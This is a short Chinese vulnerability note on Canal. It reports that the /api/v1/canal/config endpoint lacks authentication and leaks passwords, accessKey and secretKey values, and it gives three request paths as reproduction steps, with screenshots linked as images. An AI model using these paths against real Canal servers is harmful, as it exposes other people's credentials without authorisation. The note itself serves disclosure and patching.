# Canal存在敏感信息泄露漏洞

### 一、漏洞描述
由于/api/v1/canal/config 未进行权限验证可直接访问，导致账户密码、accessKey、secretKey等一系列敏感信息泄露

### 二、影响版本
![1724655325946-ad9a7d05-7071-45fd-af16-6bbea6200466.png](./img/gC-N1JsYpGKl-Ujh/1724655325946-ad9a7d05-7071-45fd-af16-6bbea6200466-514319.png)

### 三、漏洞复现
```plain
/api/v1/canal/config/1/0
```

```plain
/api/v1/canal/config/0/9
```

```plain
/api/v1/canal/instance/1
```

![1724655404641-4703126f-5cc5-4a11-b276-958eac455a81.png](./img/gC-N1JsYpGKl-Ujh/1724655404641-4703126f-5cc5-4a11-b276-958eac455a81-068083.png)



> 更新: 2024-09-05 23:24:41  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ulgmpe74leezg156>